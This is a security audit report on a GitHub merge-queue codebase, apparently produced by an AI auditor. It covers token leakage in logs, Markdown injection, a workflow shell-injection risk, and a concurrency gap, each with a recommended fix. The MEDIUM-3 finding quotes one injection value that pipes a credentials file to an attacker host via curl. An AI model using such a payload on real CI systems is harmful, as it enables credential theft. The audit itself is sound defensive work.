# Security Audit Report — merge-queue

**Date:** 2026-04-05
**Auditor:** Claude (claude-opus-4-6)
**Scope:** `merge_queue/`, `.github/workflows/`, `pyproject.toml`
**Branch audited:** `main` (2026-04-05)

---

## Executive Summary

A fresh security sweep of the merge queue codebase. All previously-reported Critical and High findings have been resolved and are omitted. Three open findings remain from the prior audit (re-verified), plus two new findings discovered in this sweep.

---

## Findings

### MEDIUM-1: Exception logging may echo token fragments

**File:** `merge_queue/cli.py`, lines 79, 124, 207, 700, 941, 1045, 1476; `merge_queue/batch.py`, lines 108, 162; `merge_queue/config.py`, line 377

**Description:**

Exception messages from the `requests` library can include the full request URL and, depending on the exception type, the `Authorization` header value. Python's default exception formatting does not redact headers. When a `requests.HTTPError` or `requests.ConnectionError` is raised, the exception string logged via `log.error(...)` or `log.warning(...)` may contain fragments of the bearer token.

GitHub Actions logs are retained and viewable by anyone with repo read access (public repos) or org members (private repos). An incomplete token fragment leaking into logs reduces the brute-force space for token recovery.

Additionally, `github_client.py` line 610 logs `r.text[:500]` from API error responses, which could contain sensitive context in edge cases.

**Risk:** Low-to-medium. Requires a network error or API error to trigger, and GitHub Actions masks known secret values in logs. But partial token exposure through exception chains bypasses masking.

**Recommended fix:**

Catch `requests.HTTPError` separately and log only `e.response.status_code` and `e.response.reason` without the full exception chain. Use a sanitizing wrapper:

```python
def _safe_error(e: Exception) -> str:
    if hasattr(e, "response") and e.response is not None:
        return f"HTTP {e.response.status_code} {e.response.reason}"
    import re
    return re.sub(r'Bearer\s+\S+', 'Bearer [REDACTED]', str(e))
```

---

### MEDIUM-2: Unsanitized error strings rendered in PR comments

**File:** `merge_queue/cli.py`, lines 960-963, 1477; `merge_queue/comments.py`, lines 255, 276-277

**Description:**

When batch creation fails, the raw exception message (`str(e)`) is passed to `comments.batch_error()` and rendered into a PR comment without sanitization. The `batch_error()` function does not call `_sanitize()` on the error string before embedding it in Markdown.

The error string can contain git stderr output, which includes branch names (user-controlled) and merge conflict details. A crafted branch name could break Markdown structure in the error comment. Similarly, `cli.py:1477` renders `{e}` directly in a break-glass failure comment.

The `comments.failed()` function at line 255 also renders `reason` without sanitization, though its callers currently pass controlled strings ("CI failed", divergence messages).

**Risk:** Low. The attack requires a user to craft a branch name that triggers a specific error path, and GitHub's comment renderer provides some built-in sanitization. However, Markdown injection could produce confusing or misleading comments.

**Recommended fix:**

Apply `_sanitize()` to error strings before embedding in Markdown comments. In `batch_error()` and `failed()`, sanitize the `error`/`reason` parameter. In `cli.py:1477`, sanitize the exception message.

---

### MEDIUM-3: CI workflow `delay` input interpolated in shell context

**File:** `.github/workflows/ci.yml`, line 78

```yaml
DELAY="${{ inputs.delay || '0' }}"
```

**Description:**

The `delay` input is defined as `type: string` with no validation. It is directly interpolated into a `run:` shell context. A user with write access (required for `workflow_dispatch`) could supply a value like `0"; curl https://attacker.com/exfil?t=$(cat /home/runner/.credentials) #` to execute arbitrary shell commands.

**Risk:** Low. Exploiting this requires `actions: write` permission on the repo, which already grants the ability to create workflows with arbitrary code. This is a defense-in-depth concern, not a privilege escalation.

**Recommended fix:**

Pass the input as an environment variable instead of interpolating it:

```yaml
- name: CI delay
  run: |
    if [ "$DELAY" -gt 0 ] 2>/dev/null; then
      echo "Sleeping ${DELAY}s for integration test..."
      sleep "$DELAY"
    fi
  env:
    DELAY: ${{ inputs.delay || '0' }}
```

---

### LOW-1: `dispatch_ci_on_ref` accepts arbitrary branch refs from PR data

**File:** `merge_queue/cli.py`, line 1207; `merge_queue/github_client.py`, line 689

**Description:**

The `do_retest` function dispatches a CI workflow run on `pr_data["head"]["ref"]` -- a branch name fetched from the GitHub API for an open PR. While this is not directly attacker-controlled (it goes through the API), the `workflow_dispatch` event is triggered with a user-controlled branch name as both the `ref` and `inputs.ref`. The `ci.yml` workflow uses `inputs.ref` as a `git checkout` ref without quoting issues in the YAML (it uses `${{ inputs.ref || github.sha }}`), which is safe as a GitHub expression. No direct injection risk identified, but the pattern should be reviewed if the CI workflow is extended.

**Risk:** Very low. No current injection vector; noted for future-proofing.

---

### LOW-2: Concurrency group does not cover CI workflow

**File:** `.github/workflows/merge-queue.yml`, lines 13-15

**Description:**

The `concurrency: group: merge-queue` setting prevents two MQ workflow runs from overlapping. However, it does not prevent a race between an MQ run dispatching CI and a separate PR label event triggering a second MQ run after the `store.write(state)` call sets `active_batch` but before CI completes.

The code has a 30-minute stale-batch recovery timer and state-based guards, which mitigate this. The window between `store.write` and CI completion is long enough for a race if GitHub's concurrency enforcement has any gap (e.g., a rapid label add/remove/add sequence). This is primarily an operational reliability issue, but could be used to DoS the queue.

**Risk:** Low. Mitigated by stale-batch recovery and state guards.

---

## Summary Table

| ID | Severity | Title |
|---|---|---|
| MEDIUM-1 | Medium | Exception logging may echo token fragments |
| MEDIUM-2 | Medium | Unsanitized error strings rendered in PR comments |
| MEDIUM-3 | Medium | CI workflow `delay` input interpolated in shell context |
| LOW-1 | Low | `dispatch_ci_on_ref` uses PR-supplied branch ref |
| LOW-2 | Low | Concurrency gap allows queue DoS via rapid label events |

---

## Recommended Fix Priority

1. **MEDIUM-1** -- Exception logging may echo token fragments. Add a `_safe_error` wrapper to strip bearer tokens from logged exceptions.
2. **MEDIUM-2** -- Unsanitized error strings in PR comments. Apply `_sanitize()` to all user-facing error messages before Markdown rendering.
3. **MEDIUM-3** -- CI workflow `delay` input shell injection. Use environment variable instead of direct interpolation.
4. **LOW-1** -- `dispatch_ci_on_ref` branch ref pattern. No action needed now; review if CI workflow changes.
5. **LOW-2** -- Concurrency gap. No action needed; mitigated by existing guards.

## Security Posture Notes

- **Code installation**: The workflow installs from the default branch only (`main`), not from PR branches. This eliminates the critical code-execution vector found in the original audit.
- **Command passing**: The MQ command is passed via `$MQ_CMD` environment variable, not shell interpolation. Safe against injection.
- **Admin token separation**: `MQ_ADMIN_TOKEN` is lazily used only for admin operations (rulesets, `update_ref`). The admin session is only constructed at init but only exercised by `create_ruleset`, `delete_ruleset`, `get_ruleset`, `list_rulesets`, and `update_ref`.
- **State branch protection**: `mq/*` branches are protected by an auto-created `mq-branches-protect` ruleset. `mq/state` relies on admin-token-only push access and workflow concurrency for integrity.
- **Break-glass/hotfix auth**: Both `break-glass` and `hotfix` are gated by `_is_break_glass_authorized()`, checking GitHub admin/maintain permission and the `break_glass_users` config list.
- **Markdown sanitization**: PR titles, branch names, and target branches are sanitized via `_sanitize()` before embedding in comment Markdown. Error strings are the remaining gap (MEDIUM-2).
- **Subprocess calls**: All `subprocess.run()` calls in `batch.py` use list-form arguments (no `shell=True`), preventing shell injection through branch names.

---

*This report was produced by automated analysis of the codebase. It does not substitute for a full penetration test or a red-team exercise against a live deployment.*
